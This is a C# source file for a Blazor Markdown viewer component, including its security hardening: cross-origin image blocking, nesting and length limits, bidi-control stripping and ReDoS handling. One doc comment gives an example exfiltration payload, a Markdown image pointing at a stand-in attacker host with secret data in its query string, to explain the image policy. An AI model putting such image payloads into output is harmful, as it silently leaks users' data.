using System.Diagnostics.CodeAnalysis;
using System.Text.RegularExpressions;
using Microsoft.AspNetCore.Components.Routing;

namespace Bit.BlazorUI;

/// <summary>
/// BitMarkdownViewer is a native, SEO friendly Blazor component that renders Markdown
/// to HTML entirely in C#. There is no JavaScript interop and no third-party packages.
/// </summary>
/// <remarks>
/// <para>
/// By default the component understands the CommonMark core: headings, emphasis, links and
/// images (including reference links and link reference definitions), lists, block quotes,
/// code, and HTML character references. Richer flavors (GitHub tables, strikethrough, task
/// lists, autolinks, footnotes, alerts, emoji, ...) are opt-in: supply a
/// <see cref="Pipeline"/> built with the desired extensions (for example
/// <see cref="BitMarkdownPipelines.GitHub"/>).
/// </para>
/// <para>
/// Parsing produces an AST which is walked with a <see cref="Microsoft.AspNetCore.Components.Rendering.RenderTreeBuilder"/>,
/// so the output is real DOM rather than an <c>innerHTML</c> blob. Raw HTML in the source
/// is treated as text and link / image URLs are sanitized, keeping the output safe from
/// script injection by default.
/// </para>
/// <para>
/// <see cref="BitComponentBase.Dir"/> set to <see cref="BitDir.Auto"/> is applied block by block:
/// every paragraph, heading, list item and table cell takes the direction of its own text, so a document mixing
/// right-to-left and left-to-right languages lays each one out the right way round. What a
/// <see cref="CodeBlockTemplate"/>, <see cref="ImageTemplate"/> or <see cref="LinkTemplate"/>
/// draws is outside the viewer's stylesheet, so a component placed there keeps its own look.
/// </para>
/// </remarks>
public partial class BitMarkdownViewer : BitComponentBase
{
    private BitMarkdownDocumentNode _document = new();
    private string? _parsedSource;
    private BitMarkdownPipeline? _parsedWith;
    private BitMarkdownViewerImageRendering _parsedImageRendering;
    private int _parsedMaxDepth;
    private int _parsedMaxLength;
    private int _parsedHeadingLevelOffset;
    private string? _parsedHeadingIdPrefix;
    private bool _parsedStripBidi;
    private bool _wiredInteractiveTasks;
    private bool _hasInPageLinks;
    private bool _notifyParsed;
    private BitMarkdownRenderer? _renderer;
    private BitMarkdownPipeline? _rendererPipeline;
    private string? _rendererDocumentUrl;
    private bool _rendererHasTemplates;
    private bool _rendererAutoDirection;
    private bool _rendererStandalone;
    private string? _renderedDocumentUrl;
    private bool _followsLocation;



    [Inject] private NavigationManager _navigationManager { get; set; } = default!;



    /// <summary>
    /// Gets or sets the cascading parameters for the markdown viewer component.
    /// </summary>
    /// <remarks>
    /// This property receives its value from an ancestor component via Blazor's cascading parameter mechanism.
    /// <br />
    /// The intended use is to allow shared configuration or settings (the pipeline, the untrusted-input limits and the
    /// templates of a site, above all) to be applied to multiple markdown viewer components through the
    /// <see cref="BitParams"/> component.
    /// </remarks>
    [CascadingParameter(Name = BitMarkdownViewerParams.ParamName)]
    public BitMarkdownViewerParams? CascadingParameters { get; set; }



    /// <summary>
    /// The Markdown string value to render as html elements.
    /// </summary>
    [Parameter] public string? Markdown { get; set; }

    /// <summary>
    /// Shifts every heading down by this many levels, so the document's outline nests under the page it is placed in:
    /// with an offset of 1, a <c>#</c> heading renders as an <c>h2</c>. The result is clamped to <c>h1</c>-<c>h6</c>,
    /// so headings that would go deeper all render as <c>h6</c>. Use it wherever the page already has its own
    /// <c>h1</c> - a comment, a chat message, a card - so the document does not compete with it for the top of the
    /// outline assistive technology navigates by. Defaults to 0.
    /// </summary>
    [Parameter] public int HeadingLevelOffset { get; set; }

    /// <summary>
    /// Prepended to the id of every heading, and to every in-page link in the document that points at one, so the
    /// document's ids cannot collide with the page's or with another viewer's - the way GitHub writes
    /// <c>user-content-</c> before the ids a README declares. Set it wherever several documents share a page (the
    /// messages of a chat, the comments of a thread), which would otherwise give two headings one id and send every
    /// link to it to the first, and wherever the source is untrusted, since a <c>{#id}</c> heading can otherwise
    /// take an id the page's own script looks elements up by. Heading ids come from the auto-identifier flavor.
    /// </summary>
    [Parameter] public string? HeadingIdPrefix { get; set; }

    /// <summary>
    /// The processing pipeline (flavor set). Defaults to <see cref="BitMarkdownPipelines.Basic"/>,
    /// i.e. the basic CommonMark core with no extensions.
    /// </summary>
    [Parameter] public BitMarkdownPipeline? Pipeline { get; set; }

    /// <summary>
    /// Controls whether remote images are allowed to load, guarding against silent
    /// data-exfiltration via auto-fetched image URLs (for example
    /// <c>![x](https://attacker.com/leak?data=SECRET)</c>). Defaults to the safe
    /// <see cref="BitMarkdownViewerImageRendering.SameOrigin"/> policy, which blocks
    /// cross-origin images while still loading same-origin and relative ones; set it
    /// to <see cref="BitMarkdownViewerImageRendering.All"/> to opt back in to loading
    /// every remote image when the Markdown source is fully trusted, or to
    /// <see cref="BitMarkdownViewerImageRendering.None"/> for the strictest policy.
    /// </summary>
    [Parameter] public BitMarkdownViewerImageRendering ImageRendering { get; set; } = BitMarkdownViewerImageRendering.SameOrigin;

    /// <summary>
    /// The maximum block/inline nesting depth allowed while parsing. Content nested
    /// deeper than this is rendered as plain text instead of being parsed further.
    /// This is an always-on safeguard against denial-of-service via pathologically
    /// nested input (e.g. thousands of nested blockquotes or lists) that would
    /// otherwise overflow the stack. Defaults to 100; values &lt;= 0 fall back to the
    /// default. Legitimate documents never approach this limit.
    /// </summary>
    [Parameter] public int MaxNestingDepth { get; set; } = BitMarkdownParseOptions.DefaultMaxDepth;

    /// <summary>
    /// When greater than zero, the Markdown source is truncated to this many characters
    /// before parsing. Use it to bound the work done on untrusted input. Defaults to 0
    /// (no limit).
    /// </summary>
    [Parameter] public int MaxLength { get; set; }

    /// <summary>
    /// When <c>true</c>, Unicode bidirectional control characters are stripped from the
    /// source before parsing, neutralizing "Trojan Source" (CVE-2021-42574) spoofing
    /// where text is made to display in a different order than it is encoded. Recommended
    /// for untrusted or AI-generated Markdown. Defaults to <c>false</c> to preserve
    /// explicit right-to-left embedding in trusted content. Zero-width joiners used by
    /// emoji and complex scripts are never removed.
    /// </summary>
    [Parameter] public bool StripBidiControlCharacters { get; set; }

    /// <summary>
    /// Renders the document as inline content: the root element becomes a <c>span</c> and each
    /// top-level paragraph contributes its inline content directly, without the <c>&lt;p&gt;</c>
    /// that would otherwise force a line of its own. Use it where a short piece of Markdown has to
    /// sit inside a sentence, a table cell or a label. Blocks that are not paragraphs (lists,
    /// tables, headings) still render as themselves. Defaults to <c>false</c>.
    /// </summary>
    [Parameter, ResetClassBuilder] public bool Inline { get; set; }

    /// <summary>
    /// Called after the Markdown source has been parsed, with the document that is about to
    /// be rendered. The tree is the same one the renderer walks, so a handler can read it -
    /// to build a table of contents from the headings, for example - or rewrite it before it
    /// reaches the DOM.
    /// </summary>
    [Parameter] public EventCallback<BitMarkdownDocumentNode> OnParsed { get; set; }

    /// <summary>
    /// Called when a reader ticks or unticks a task-list checkbox, with the source rewritten to
    /// match. Setting it is what makes the checkboxes interactive at all: with no handler they stay
    /// the read-only boxes GitHub renders, so a document nobody is storing cannot be half-edited.
    /// The viewer does not change <see cref="Markdown"/> itself - it hands you the new source and
    /// leaves storing it to you, which is what keeps the component's state the one you own.
    /// Requires the task-list flavor.
    /// </summary>
    [Parameter] public EventCallback<BitMarkdownViewerTaskChangedEventArgs> OnTaskChanged { get; set; }

    /// <summary>
    /// Renders every fenced or indented code block, instead of the <c>&lt;pre&gt;&lt;code&gt;</c>
    /// the viewer would otherwise draw. This is where a syntax highlighter, a copy button or a
    /// diagram renderer goes: the template is given the block, so it can read the language off
    /// <c>Info</c> and the source off <c>Content</c>. The template's output is outside the viewer's
    /// stylesheet (it is drawn into a <c>display: contents</c> wrapper the rules stop at), so it is
    /// styled by whatever it is - a component keeps its own look, a bare <c>&lt;pre&gt;</c> needs
    /// a rule of yours.
    /// </summary>
    [Parameter] public RenderFragment<BitMarkdownCodeBlockNode>? CodeBlockTemplate { get; set; }

    /// <summary>
    /// Renders every image, instead of the <c>&lt;img&gt;</c> the viewer would otherwise draw -
    /// for a lightbox, a placeholder while it loads, or a component that serves a modern format.
    /// The <see cref="ImageRendering"/> policy has already been applied when the template runs, so
    /// a blocked image reaches it with an empty <c>Url</c>.
    /// </summary>
    [Parameter] public RenderFragment<BitMarkdownImageNode>? ImageTemplate { get; set; }

    /// <summary>
    /// Renders every link, instead of the <c>&lt;a&gt;</c> the viewer would otherwise draw - to
    /// route an in-app destination through the router, or to decorate an external one. The
    /// destination has already been sanitized when the template runs, and an in-page one
    /// (<c>#id</c>) has been written against the page, as every link the viewer draws is.
    /// </summary>
    /// <remarks>
    /// A link's own content is not rendered for you: write
    /// <c>@context.Children</c> through a renderer of your own, or - far more usually - read
    /// <c>BitMarkdownInlineHelpers.PlainText(context.Children)</c> for its text.
    /// </remarks>
    [Parameter] public RenderFragment<BitMarkdownLinkNode>? LinkTemplate { get; set; }



    /// <summary>
    /// The most recently parsed document. Useful for reading structure out of the source
    /// (headings, links, images) without parsing it a second time.
    /// </summary>
    public BitMarkdownDocumentNode Document => _document;



    protected override string RootElementClass => "bit-mdv";

    protected override void RegisterCssClasses()
    {
        ClassBuilder.Register(() => Inline ? "bit-mdv-inline" : string.Empty);
    }

    private BitMarkdownPipeline EffectivePipeline => Pipeline ?? BitMarkdownPipelines.Basic;

    protected override void OnInitialized()
    {
        // The in-page links are written against the address of the page, which can change under a viewer
        // that stays put (a query string, a route parameter of the same page). There is nothing to follow
        // where the navigation manager was never initialized.
        if (TryReadAddress(out _, out _))
        {
            _navigationManager.LocationChanged += HandleLocationChanged;
            _followsLocation = true;
        }

        base.OnInitialized();
    }

    [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(BitMarkdownViewerParams))]
    protected override void OnParametersSet()
    {
        // Before anything below reads the parameters it may fill in.
        CascadingParameters?.UpdateParameters(this);

        var pipeline = EffectivePipeline;
        var maxDepth = MaxNestingDepth > 0 ? MaxNestingDepth : BitMarkdownParseOptions.DefaultMaxDepth;

        // Re-parse only when an input that affects the output changes.
        if (_parsedSource != Markdown ||
            ReferenceEquals(_parsedWith, pipeline) is false ||
            _parsedImageRendering != ImageRendering ||
            _parsedMaxDepth != maxDepth ||
            _parsedMaxLength != MaxLength ||
            _parsedHeadingLevelOffset != HeadingLevelOffset ||
            string.Equals(_parsedHeadingIdPrefix, HeadingIdPrefix, StringComparison.Ordinal) is false ||
            _parsedStripBidi != StripBidiControlCharacters)
        {
            _document = ParseSafely(pipeline, maxDepth);
            ApplyImageRendering();
            ApplyHeadingLevelOffset();
            ApplyHeadingIdPrefix();
            ScopeFootnoteIds();
            _hasInPageLinks = HoldsInPageLinks();
            _wiredInteractiveTasks = false;
            _parsedSource = Markdown;
            _parsedWith = pipeline;
            _parsedImageRendering = ImageRendering;
            _parsedMaxDepth = maxDepth;
            _parsedMaxLength = MaxLength;
            _parsedHeadingLevelOffset = HeadingLevelOffset;
            _parsedHeadingIdPrefix = HeadingIdPrefix;
            _parsedStripBidi = StripBidiControlCharacters;
            _notifyParsed = true;
        }

        // Interactivity is wired onto the parsed tree rather than parsed into it, so enabling or disabling the
        // viewer, or starting to listen, re-wires the checkboxes without parsing the source again.
        var interactiveTasks = AreTasksInteractive;
        if (_wiredInteractiveTasks != interactiveTasks)
        {
            WireTaskCheckboxes(interactiveTasks);
            _wiredInteractiveTasks = interactiveTasks;
        }

        base.OnParametersSet();
    }

    // A disabled viewer keeps its checkboxes the read-only boxes a document nobody is editing shows.
    private bool AreTasksInteractive => OnTaskChanged.HasDelegate && Disabled is false;

    protected override async Task OnParametersSetAsync()
    {
        await base.OnParametersSetAsync();

        // Raised from the async half of the lifecycle so an exception thrown by the handler
        // surfaces through the renderer instead of being lost on an unobserved task.
        if (_notifyParsed)
        {
            _notifyParsed = false;
            if (OnParsed.HasDelegate)
            {
                await OnParsed.InvokeAsync(_document);
                // The handler may have rewritten the tree, adding a link to the page or taking the last one out.
                _hasInPageLinks = HoldsInPageLinks();
            }
        }
    }

    /// <summary>
    /// Gives every task-list checkbox the handler that makes it interactive, and the text it is named
    /// after, when the host is listening - or takes the handler back off when it no longer is. The handler
    /// reads <see cref="OnTaskChanged"/> at the moment it fires rather than capturing it, so the callback the
    /// host most recently supplied is always the one invoked. The name is read off the finished tree, after
    /// every extension has rewritten the text.
    /// </summary>
    private void WireTaskCheckboxes(bool interactive)
    {
        foreach (var node in BitMarkdownAstHelper.Descendants(_document))
        {
            if (node is not BitMarkdownListItemNode { IsTask: true } item) continue;
            if (item.Children.FirstOrDefault() is not BitMarkdownParagraphNode paragraph) continue;
            if (paragraph.Inlines.FirstOrDefault() is not BitMarkdownTaskCheckboxNode box) continue;

            if (interactive is false)
            {
                box.OnChange = null;
                continue;
            }

            var text = new BitMarkdownParagraphNode();
            text.Inlines.AddRange(paragraph.Inlines.Skip(1));
            box.Label = BitMarkdownAstHelper.ToPlainText(text);
            box.OnChange = EventCallback.Factory.Create<ChangeEventArgs>(this, args => HandleTaskChangedAsync(box, args));
        }
    }

    /// <summary>
    /// Stamps this instance's unique id onto every footnote node, so the ids and the links
    /// between them belong to this viewer alone. Two viewers showing footnotes on the same page
    /// would otherwise emit the same ids, and a reference in one would jump into the other.
    /// </summary>
    private void ScopeFootnoteIds()
    {
        if (_document.Children.OfType<BitMarkdownFootnotesNode>().Any() is false) return;

        foreach (var node in BitMarkdownAstHelper.Descendants(_document))
        {
            switch (node)
            {
                case BitMarkdownFootnotesNode footnotes: footnotes.IdScope = UniqueId; break;
                case BitMarkdownFootnoteDefinitionNode definition: definition.IdScope = UniqueId; break;
                case BitMarkdownFootnoteReferenceNode reference: reference.IdScope = UniqueId; break;
            }
        }
    }

    private Task HandleTaskChangedAsync(BitMarkdownTaskCheckboxNode checkbox, ChangeEventArgs args)
    {
        bool isChecked = args.Value is bool value ? value : bool.TryParse(args.Value?.ToString(), out var parsed) && parsed;

        // The tree is updated so the box keeps the state the reader just gave it even if the host
        // stores the new source somewhere the component does not read back.
        checkbox.Checked = isChecked;

        // The box itself carries the line its marker was parsed from, so the marker rewritten is
        // the one the reader clicked - not one a second scan of the source went looking for.
        return OnTaskChanged.InvokeAsync(new BitMarkdownViewerTaskChangedEventArgs(
            checkbox.Index,
            isChecked,
            BitMarkdownTaskList.Toggle(Markdown, checkbox, isChecked)));
    }

    /// <summary>
    /// Applies the input-hardening steps (bidi stripping, length cap) and parses with the
    /// configured depth limit, degrading gracefully to plain text if a parser regex hits
    /// its anti-ReDoS timeout.
    /// </summary>
    private BitMarkdownDocumentNode ParseSafely(BitMarkdownPipeline pipeline, int maxDepth)
    {
        var source = Markdown;

        if (StripBidiControlCharacters && !string.IsNullOrEmpty(source))
            source = BitMarkdownTextSanitizer.StripBidiControlCharacters(source);

        if (MaxLength > 0 && source is not null && source.Length > MaxLength)
        {
            // Never cut between the two halves of a surrogate pair: the lone half would
            // render as a replacement character instead of the emoji (or other astral
            // character) the author wrote.
            int end = MaxLength;
            if (char.IsHighSurrogate(source[end - 1])) end--;
            source = source[..end];
        }

        var options = new BitMarkdownParseOptions { MaxDepth = maxDepth };

        try
        {
            return pipeline.Parse(source, options);
        }
        catch (RegexMatchTimeoutException)
        {
            // A parser regex hit its safety timeout on hostile input. Fall back to a
            // plain-text rendering of the source instead of surfacing the exception.
            var fallback = new BitMarkdownDocumentNode();
            var paragraph = new BitMarkdownParagraphNode();
            paragraph.Inlines.Add(new BitMarkdownTextNode(source ?? string.Empty));
            fallback.Children.Add(paragraph);
            return fallback;
        }
    }

    protected override void BuildRenderTree(RenderTreeBuilder builder)
    {
        // A document with no in-page link has nothing to write against the page, so it keeps the shared
        // renderer and is left alone when the address changes.
        _renderedDocumentUrl = _hasInPageLinks ? ResolveDocumentUrl() : null;
        var renderer = ResolveRenderer(_renderedDocumentUrl);

        // Inline mode wants a span, but a span may not legally hold a list or a table. A document
        // that is nothing but paragraphs gets one; anything else keeps the div and is laid out
        // inline by the stylesheet instead, so the markup stays valid either way.
        bool asSpan = Inline && HoldsOnlyParagraphs(_document.Children);

        builder.OpenElement(0, asSpan ? "span" : "div");

        builder.AddMultipleAttributes(1, HtmlAttributes);
        builder.AddAttribute(2, "id", _Id);
        builder.AddAttribute(3, "style", StyleBuilder.Value);
        builder.AddAttribute(4, "class", ClassBuilder.Value);
        if (Dir is not null)
        {
            builder.AddAttribute(5, "dir", Dir.Value.ToString().ToLower());
        }
        if (AriaLabel is not null)
        {
            builder.AddAttribute(6, "aria-label", AriaLabel);
        }
        // A name is only announced on an element with a role, which a div has none of: a named document is
        // a region of the page, however it was named, unless the host has given it a role of its own.
        if (asSpan is false && IsNamed && GetSplattedAttribute("role") is null)
        {
            builder.AddAttribute(7, "role", "region");
        }
        if (TabIndex is not null)
        {
            builder.AddAttribute(8, "tabindex", TabIndex);
        }
        builder.AddElementReferenceCapture(9, v => RootElement = v);

        if (Inline)
        {
            WriteInline(renderer, builder, _document.Children);
        }
        else
        {
            renderer.WriteNodes(builder, _document.Children);
        }

        builder.CloseElement();
    }

    /// <summary>
    /// The renderer this viewer draws with. With no template supplied, on a page that is the base
    /// address itself (or for a document with no in-page link), with no automatic direction and on a
    /// page that is there, it is the pipeline's own, shared instance - which holds nothing but the
    /// pipeline's immutable renderer list, so there is nothing to allocate per render. Otherwise the
    /// viewer gets a renderer of its own, built once per pipeline, page address, direction and page:
    /// one that writes in-page links against the page, gives each block its own direction under
    /// <see cref="BitDir.Auto"/>, hides its screen reader text inline where there is no page (so no
    /// stylesheet), and has the template renderer last so it wins over everything the pipeline registered.
    /// </summary>
    private BitMarkdownRenderer ResolveRenderer(string? documentUrl)
    {
        var pipeline = EffectivePipeline;
        bool hasTemplates = CodeBlockTemplate is not null || ImageTemplate is not null || LinkTemplate is not null;
        // One direction guessed for a whole document lays every block written in the other language out
        // backwards, so Auto is taken block by block, the way GitHub renders a comment.
        bool autoDirection = Dir == BitDir.Auto;
        // A viewer with no page to follow was rendered by an HtmlRenderer - into an email, a static file -
        // and is read without the stylesheet.
        bool standalone = _followsLocation is false;

        if (hasTemplates is false && documentUrl is null && autoDirection is false && standalone is false)
            return pipeline.Renderer;

        if (_renderer is null ||
            ReferenceEquals(_rendererPipeline, pipeline) is false ||
            _rendererHasTemplates != hasTemplates ||
            _rendererAutoDirection != autoDirection ||
            _rendererStandalone != standalone ||
            string.Equals(_rendererDocumentUrl, documentUrl, StringComparison.Ordinal) is false)
        {
            IReadOnlyList<BitMarkdownNodeRenderer> renderers = hasTemplates
                ? [.. pipeline.Renderers, new BitMarkdownViewerTemplateRenderer(this)]
                : pipeline.Renderers;

            // Given the pipeline's own words, so supplying a template does not silently put a
            // localized document's alerts and back-links back into English.
            _renderer = new BitMarkdownRenderer(renderers, pipeline.Texts)
            {
                DocumentUrl = documentUrl,
                AutoDirection = autoDirection,
                Standalone = standalone
            };
            _rendererPipeline = pipeline;
            _rendererHasTemplates = hasTemplates;
            _rendererAutoDirection = autoDirection;
            _rendererStandalone = standalone;
            _rendererDocumentUrl = documentUrl;
        }

        return _renderer;
    }

    /// <summary>
    /// The address an in-page link has to be written against: the page's path and query, or
    /// <c>null</c> when the page is the base address, where a bare <c>#id</c> already lands.
    /// </summary>
    private string? ResolveDocumentUrl()
    {
        if (TryReadAddress(out var uri, out var baseUri) is false) return null;

        int hash = uri.IndexOf('#');
        if (hash >= 0) uri = uri[..hash];

        if (string.Equals(uri, baseUri, StringComparison.Ordinal)) return null;

        // Relative to the origin rather than absolute, so a prerendered document behind a proxy does
        // not carry the address the server saw.
        return Uri.TryCreate(uri, UriKind.Absolute, out var absolute) ? absolute.PathAndQuery : uri;
    }

    /// <summary>
    /// Reads the page and base addresses, which a <see cref="NavigationManager"/> that was never
    /// initialized - a viewer rendered by an <c>HtmlRenderer</c> into an email or a static file -
    /// refuses to answer. There is no page there for an in-page link to be resolved against.
    /// </summary>
    private bool TryReadAddress(out string uri, out string baseUri)
    {
        try
        {
            uri = _navigationManager.Uri;
            baseUri = _navigationManager.BaseUri;
            return true;
        }
        catch (InvalidOperationException)
        {
            uri = baseUri = string.Empty;
            return false;
        }
    }

    private void HandleLocationChanged(object? sender, LocationChangedEventArgs args)
    {
        if (IsDisposed || _hasInPageLinks is false) return;

        if (string.Equals(ResolveDocumentUrl(), _renderedDocumentUrl, StringComparison.Ordinal)) return;

        _ = InvokeAsync(StateHasChanged);
    }

    private bool IsNamed => AriaLabel.HasValue()
                            || GetSplattedAttribute("aria-label").HasValue()
                            || GetSplattedAttribute("aria-labelledby").HasValue();

    /// <summary>
    /// Whether the document draws a destination that is written against the page: an in-page link, a
    /// heading's permalink, a footnote and its back-links. A node of a flavor outside this library may
    /// draw one too, so it counts as one.
    /// </summary>
    private bool HoldsInPageLinks()
    {
        foreach (var node in BitMarkdownAstHelper.Descendants(_document))
        {
            switch (node)
            {
                case BitMarkdownLinkNode { Url: ['#', ..] }:
                case BitMarkdownHeadingAnchorNode:
                case BitMarkdownFootnoteReferenceNode:
                case BitMarkdownFootnoteDefinitionNode:
                    return true;
            }

            if (node.GetType().Assembly != typeof(BitMarkdownNode).Assembly) return true;
        }

        return false;
    }

    /// <summary>
    /// Replaces every heading with one <see cref="HeadingLevelOffset"/> levels deeper, clamped to
    /// h1-h6. The level is init-only, so the node is replaced rather than changed, keeping its id
    /// and its content.
    /// </summary>
    private void ApplyHeadingLevelOffset()
    {
        if (HeadingLevelOffset == 0) return;

        BitMarkdownAstHelper.VisitChildLists(_document, nodes =>
        {
            for (int i = 0; i < nodes.Count; i++)
            {
                switch (nodes[i])
                {
                    case BitMarkdownHeadingNode heading:
                        var shifted = new BitMarkdownHeadingNode
                        {
                            Level = Math.Clamp(heading.Level + HeadingLevelOffset, 1, 6),
                            Id = heading.Id
                        };
                        shifted.Inlines.AddRange(heading.Inlines);
                        nodes[i] = shifted;
                        break;

                    case BitMarkdownFootnotesNode footnotes:
                        footnotes.HeadingLevel = Math.Clamp(2 + HeadingLevelOffset, 1, 6);
                        break;
                }
            }
        });
    }

    /// <summary>
    /// Prepends <see cref="HeadingIdPrefix"/> to every heading id, then to every permalink and in-page link that
    /// pointed at one of them. A link to any other fragment is left alone: it points at something outside the
    /// document, which keeps the id it has.
    /// </summary>
    private void ApplyHeadingIdPrefix()
    {
        if (string.IsNullOrEmpty(HeadingIdPrefix)) return;

        var ids = new HashSet<string>(StringComparer.Ordinal);
        foreach (var heading in BitMarkdownAstHelper.Descendants(_document).OfType<BitMarkdownHeadingNode>())
        {
            if (string.IsNullOrEmpty(heading.Id)) continue;

            ids.Add(heading.Id);
            heading.Id = HeadingIdPrefix + heading.Id;
        }

        if (ids.Count > 0)
        {
            PrefixInPageLinks(_document, HeadingIdPrefix, ids);
        }
    }

    // The permalink's id and the link's destination are init-only, so the nodes are replaced rather than changed.
    private static void PrefixInPageLinks(BitMarkdownDocumentNode document, string prefix, HashSet<string> ids)
    {
        BitMarkdownAstHelper.VisitChildLists(document, nodes =>
        {
            for (int i = 0; i < nodes.Count; i++)
            {
                switch (nodes[i])
                {
                    case BitMarkdownHeadingAnchorNode anchor when ids.Contains(anchor.Id):
                        nodes[i] = new BitMarkdownHeadingAnchorNode { Id = prefix + anchor.Id, HeadingText = anchor.HeadingText };
                        break;

                    case BitMarkdownLinkNode { Url: ['#', .. var fragment] } link
                        when ids.Contains(fragment) || ids.Contains(Uri.UnescapeDataString(fragment)):
                        var prefixed = new BitMarkdownLinkNode { Url = "#" + prefix + fragment, Title = link.Title, IsAutoLink = link.IsAutoLink };
                        prefixed.Children.AddRange(link.Children);
                        nodes[i] = prefixed;
                        break;
                }
            }
        });
    }

    private static bool HoldsOnlyParagraphs(IList<BitMarkdownNode> nodes)
    {
        foreach (var node in nodes)
        {
            if (node is not BitMarkdownParagraphNode) return false;
        }
        return true;
    }

    /// <summary>
    /// Writes the document without the block wrapper each top-level paragraph would otherwise get,
    /// so a one-line piece of Markdown can sit inside a sentence, a table cell or a button label.
    /// Every other block (a list, a table, a heading) still renders as itself.
    /// </summary>
    private static void WriteInline(BitMarkdownRenderer renderer, RenderTreeBuilder builder, IList<BitMarkdownNode> nodes)
    {
        for (int i = 0; i < nodes.Count; i++)
        {
            if (nodes[i] is BitMarkdownParagraphNode paragraph)
            {
                // Paragraphs are separated by a space rather than run together, so two of them do
                // not read as one word.
                if (i > 0) builder.AddContent(10, " ");
                renderer.WriteNodes(builder, paragraph.Inlines);
                continue;
            }

            renderer.WriteNode(builder, nodes[i]);
        }
    }

    /// <summary>
    /// Walks the parsed AST and strips the source from any image that the active
    /// <see cref="ImageRendering"/> policy disallows, so the browser never issues the
    /// underlying request. The alt text is preserved for accessibility.
    /// </summary>
    private void ApplyImageRendering()
    {
        if (ImageRendering == BitMarkdownViewerImageRendering.All)
            return;

        BitMarkdownAstHelper.VisitChildLists(_document, nodes =>
        {
            for (int i = 0; i < nodes.Count; i++)
            {
                if (nodes[i] is BitMarkdownImageNode img && ShouldBlockImage(img.Url))
                {
                    // Url is init-only, so replace the node with a source-less copy.
                    nodes[i] = new BitMarkdownImageNode
                    {
                        Url = string.Empty,
                        Title = img.Title,
                        Alt = img.Alt
                    };
                }
            }
        });
    }

    private bool ShouldBlockImage(string url) => ImageRendering switch
    {
        BitMarkdownViewerImageRendering.None => true,
        BitMarkdownViewerImageRendering.SameOrigin => IsCrossOrigin(url),
        _ => false
    };

    // Cross-origin = a URL the browser would resolve to a different origin (scheme + host
    // + port) than the current page and fetch cross-site. Relative paths, anchors and
    // same-document references stay same-origin, and so do absolute URLs that point back
    // at the current origin; only those are kept under the SameOrigin policy. Absolute
    // http(s) URLs and protocol-relative ("//host/...") URLs are resolved against the
    // page's base URI before their origins are compared, so same-origin absolute URLs are
    // no longer blocked while genuinely cross-origin ones still are.
    private bool IsCrossOrigin(string url)
    {
        if (string.IsNullOrEmpty(url))
            return false;

        var isAbsolute = url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                         url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
        var isProtocolRelative = url.StartsWith("//", StringComparison.Ordinal);

        // Relative paths, fragments and same-document references never leave the origin.
        if (isAbsolute is false && isProtocolRelative is false)
            return false;

        // Resolve the image URL against the page's base URI and compare origins.
        if (TryReadAddress(out _, out var pageBaseUri) &&
            Uri.TryCreate(pageBaseUri, UriKind.Absolute, out var baseUri) &&
            Uri.TryCreate(baseUri, url, out var imageUri))
        {
            return string.Equals(baseUri.Scheme, imageUri.Scheme, StringComparison.OrdinalIgnoreCase) is false ||
                   string.Equals(baseUri.Host, imageUri.Host, StringComparison.OrdinalIgnoreCase) is false ||
                   baseUri.Port != imageUri.Port;
        }

        // If the origin can't be determined, err on the side of caution and block.
        return true;
    }

    protected override async ValueTask DisposeAsync(bool disposing)
    {
        if (IsDisposed || disposing is false) return;

        if (_followsLocation)
        {
            _navigationManager.LocationChanged -= HandleLocationChanged;
        }

        await base.DisposeAsync(disposing);
    }
}
